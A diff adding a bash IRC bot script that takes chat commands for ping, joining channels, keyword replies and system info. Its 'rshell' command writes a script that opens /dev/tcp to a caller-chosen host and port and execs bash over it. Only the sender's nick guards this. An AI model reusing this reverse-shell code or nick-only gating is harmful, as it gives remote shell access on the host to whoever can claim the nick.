@@ -1,0 +1,279 @@
+#!/bin/bash
+
+message_post(){
+  DESTINATION=$1
+  shift
+  echo "PRIVMSG $DESTINATION :$*"
+}
+
+run_ping(){
+  [ ! -e /bin/ping ] && message_post $1 "No ping utility installed" && return
+  [ ! -e /bin/grep ] && message_post $1 "No grep utility installed" && return
+
+  [ ! "$3" ] && message_post $1 "Must supply a host to ping" && return
+
+  message_post $1 "Sending ping to [ $3 ]"
+
+  RESULT=$(/bin/ping -c 1 "$3" | /bin/grep "received")
+
+  message_post $1 "Result [ $RESULT ]"
+}
+
+run_join(){
+  [ ! "$3" ] && message_post $1 "Need to specify a room to join" && return
+  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return
+
+  echo "JOIN $3"
+  message_post $1 "Attempted to join room"
+}
+
+run_part(){
+  [ ! "$3" ] && message_post $1 "Need to specify a room to leave" && return
+  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return
+
+  echo "PART $3"
+  message_post $1 "Attempted to leave room"
+}
+
+run_nick(){
+  [ ! "$3" ] && message_post $1 "Need to specify a new nick" && return
+  [ "${3:0:1}" == "#" ] && message_post $1 "Nick [ $3 ] seems bad" && return
+
+  nick="$3"
+
+  echo "NICK $3"
+  message_post $1 "Changed nick"
+}
+
+run_speak(){
+  [ ! "$3" ] && message_post $1 "Need to give me someone to speak to" && return
+  [ $# -lt 4 ] && message_post $1 "Need to give me something to say" && return
+
+  SENDER="$1"
+
+  DEST="$3"
+  
+  shift 3
+
+  message_post $SENDER "Okay"
+  message_post $DEST $*
+}
+
+run_quit(){
+  message_post $1 "Okay, bye"
+  
+  shift 2
+  echo "QUIT $*"
+  sleep 1
+  exit 0
+}
+
+run_reverseshell(){
+
+  [ $ALLOW_REVERSE_SHELL -eq 0 ] && message_post $1 "No reverse shell" && return
+
+  [ ! -x /bin/cat ] && message_post $1 "No cat binary" && return
+  [ ! -x /usr/bin/nohup ] && message_post $1 "No nohup" && return
+  [ ! -x /bin/chmod ] && message_post $1 "No chmod binary" && return
+  [ ! -x /bin/rm ] && message_post $1 "No rm binary" && return
+
+  [ ! "$3" ] && message_post $1 "Must specify a host" && return
+  [ ! "$4" ] && message_post $1 "Must specify a port" && return
+
+  message_post $1 "Spawning a forked reverse shell to [$3:$4]..."
+
+  [ -e /tmp/makeshell ] && /bin/rm -f /tmp/makeshell
+
+  message_post $1 "Writing a makeshell shell script"
+  /bin/cat > /tmp/makeshell <<EOF
+#!/bin/bash
+exec 3<> /dev/tcp/$3/$4
+if [ $? != 0 ]; then
+   exit 0
+fi
+exec /bin/bash 0<&3 1>&3- 2>/dev/null
+EOF
+  /bin/chmod +x /tmp/makeshell
+
+  [ ! -x /tmp/makeshell ] && message_post $1 "Cannot make shell - failed" && return
+  
+  $(/usr/bin/nohup /tmp/makeshell $3 $4 >/dev/null </dev/null 2>/dev/null &)
+  message_post $1 "Spawned"
+}
+
+run_keyword(){
+  [ ! "$3" ] && message_post $1 "Please say one of (off|on|clear|add|del)" && return
+  
+  message_post $1 "Attempting to modify keyword stuff ${USE_KEYWORDS} ${#KEYWORDS[*]} "
+
+  if [ "$3" == "off" ]; then
+    message_post $1 "Use keywords off"
+    USE_KEYWORDS="0"
+  elif [ "$3" == "on" ]; then
+    message_post $1 "Use keywords on"
+    USE_KEYWORDS="1"
+  elif [ "$3" == "clear" ]; then
+    KEYWORDS=()
+    KEYWORD_RESPONSES=()
+  elif [ "$3" == "add" ]; then
+    [ ! "$4" ] && message_post $1 "Requires a word" && return
+    [ ! "$5" ] && message_post $1 "Requries at least a one word response" && return
+   
+    SENDER=$1
+    shift 3
+    KW=$1
+    KEYWORDS=("${KEYWORDS[@]}" "$1")
+    shift 1
+    RSP="$*"
+    KEYWORD_RESPONSES=("${KEYWORD_RESPONSES[@]}" "$*")
+
+    message_post $SENDER "Added [ $KW ] with [ $RSP ]"
+  elif [ "$3" == "list" ]; then
+    [ ! "$4" ] && message_post $1 "Give me a keyword" && return
+    I=0
+    for found in "${KEYWORDS[@]}"; do
+      result=$(echo "$*" | /bin/grep -i "$found")
+      if [ "${result}" ]; then
+        message_post $1 "Keyword [ ${KEYWORDS[${I}]} ] is [ ${KEYWORD_RESPONSES[$I]} ]"
+        return
+      fi
+      ((I=$I+1))
+    done
+
+  elif [ "$3" == "del" ]; then
+    I=0
+    for found in "${KEYWORDS[@]}"; do
+      result=$(echo "$*" | /bin/grep -i "$found")
+      if [ "${result}" ]; then
+          KEYWORDS=(${KEYWORDS[@]:0:$I} ${KEYWORDS[@]:$(($I + 1))})
+          KEYWORD_RESPONSES=(${KEYWORD_RESPONSES[@]:0:$I} ${KEYWORD_RESPONSES[@]:$(($I + 1))})
+          message_post $1 "Removed keyword [ $found ]"
+          return
+      fi
+      (( I=$I+1 ))
+    done
+  fi
+
+}
+
+run_emote(){
+  [ ! "$3" ] && message_post $1 "Need to give me a dest to emote" && return
+  [ $# -lt 4 ] && message_post $1 "Need to give me something to emote" && return
+
+  SENDER="$1"
+
+  DEST="$3"
+  
+  shift 3
+  message_post $SENDER "Okay"
+  echo -e "PRIVMSG $DEST :\001ACTION $*\001"
+}
+
+run_mycmd(){
+
+  [ "$1" != "aconole" -a "$1" != "brad[]" ] && message_post $1 "Sorry I don't know you" && return
+
+  if [ "$2" == "uptime" ]; then
+    [ ! -e /usr/bin/uptime ] && message_post $1 "Sorry - no uptime binary" && return
+    UPTIME=$(/usr/bin/uptime)
+    message_post $1 "Uptime - $UPTIME"
+  elif [ "$2" == "sysinfo" ]; then
+    [ ! -e /bin/uname ] && message_post $1 "No uname binary found" && return
+    UNAME=$(/bin/uname -a)
+    message_post $1 "Uname - $UNAME"
+  elif [ "$2" == "id" ]; then
+    [ ! -e /usr/bin/id ] && message_post $1 "No id binary" && return
+    IDINFO=$(/usr/bin/id)
+    message_post $1 "ID [ $IDINFO ]"
+  elif [ "$2" == "keywords" ]; then
+    message_post $1 "Keywords [ ${KEYWORDS[@]} ]"
+  elif [ "$2" == "ping" ]; then
+    run_ping $*
+  elif [ "$2" == "rshell" ]; then
+    run_reverseshell $*
+  elif [ "$2" == "nick" ]; then
+    run_nick $*
+  elif [ "$2" == "join" ]; then
+    run_join $*
+  elif [ "$2" == "part" ]; then
+    run_part $*
+  elif [ "$2" == "speak" ]; then
+    run_speak $*
+  elif [ "$2" == "emote" ]; then
+    run_emote $*
+  elif [ "$2" == "keyword" ]; then
+    run_keyword $*
+  elif [ "$2" == "quit" ]; then
+    run_quit $*
+  else
+    message_post $1 "Unknown command: [$2]"
+  fi
+
+}
+
+handler_callback_tome(){
+  debug "tome ARGS: $*"
+
+  SENDER="$1"
+
+  ACTION="${2:1}"
+
+  shift 2
+
+  if [ "${ACTION:0:1}" == \! ]; then
+     run_mycmd $SENDER "${ACTION:1}" $*
+  else
+     message_post $1 "Unable to recognize your request [$*]"
+  fi
+
+}
+
+
+#############################################################################
+##
+## CHANNEL
+##
+#############################################################################
+
+
+handler_callback_tochan(){
+  debug "TOCHAN ARGS: $*"
+
+  SENDER="$1"
+  CHANNEL="$2"
+
+  shift 2
+
+  if [ "${1:1:1}" == \! ]; then
+    if [ "${1:2}" == "uptime" ]; then
+      UPTIME=$(/usr/bin/uptime)
+      message_post $CHANNEL "$UPTIME"
+    elif [ "${1:2}" == "explode" ]; then
+      [ ! "$2" ] && message_post $CHANNEL "Explode requires a URL dumbass" && return
+      URL=$(curl -I -s "$2" | fgrep 'Location:' | cut -d" " -f2)
+      message_post $CHANNEL "Exploded url: $URL "
+    elif [ "${1:2}" == "keywords" ]; then
+      message_post $CHANNEL "Recognized keywords [ ${KEYWORDS[@]} ]"
+    else
+      message_post $CHANNEL "Channel command [ ${1:2} ] not supported"
+    fi
+
+    return
+  fi
+
+  if [ "${USE_KEYWORDS}" == "1" ]; then
+      I=0
+      for found in "${KEYWORDS[@]}"; do
+        result=$(echo "$*" | /bin/grep -i "$found")
+        if [ "${result}" ]; then
+            RESPONSE="${KEYWORD_RESPONSES[${I}]}"
+            SEDLINE="s/%SENDER%/${SENDER}/g"
+            FORMATTED_RSP=$(echo "$RESPONSE" | /bin/sed $SEDLINE)
+
+            message_post $CHANNEL "${FORMATTED_RSP}"
+            return
+        fi
+        (( I=$I+1 ))
+      done
+  fi
+}
